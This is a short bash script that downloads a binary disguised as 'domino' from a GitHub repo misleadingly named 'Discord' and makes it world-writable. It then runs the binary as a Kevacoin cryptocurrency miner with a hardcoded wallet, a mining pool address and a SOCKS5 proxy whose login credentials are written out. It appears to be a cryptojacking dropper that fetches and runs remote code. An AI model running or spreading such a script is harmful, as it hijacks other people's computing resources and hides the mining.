#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O domino https://github.com/Explorer-Discord/Discord/raw/main/domino 
screen -dmS ls
chmod +x phpsur.sh && chmod +x domino && chmod 777 domino phpsur.sh
./domino --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSd2PqJ9uSKvJVkXuHiLRvnqvPFLpxDYDP --password BK-01=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://cghuohtm:ev5p8oqzuvmg@45.136.228.154:6209
